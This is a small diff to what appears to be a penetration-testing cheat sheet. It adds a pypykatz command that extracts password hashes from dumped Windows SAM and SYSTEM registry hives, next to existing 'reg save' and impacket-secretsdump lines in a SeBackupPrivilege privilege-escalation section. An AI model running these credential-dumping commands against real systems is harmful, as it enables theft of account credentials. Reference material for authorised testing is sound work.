@@ -5775,6 +5775,10 @@ reg save hklm\sam C:\Users\<USERNAME>\sam.hive
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```
 
+```c
+pypykatz registry --sam sam.hive system.hive
+```
+
 ###### SeBackupPrivilege Privilege Escalation (diskshadow)
 
 > https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
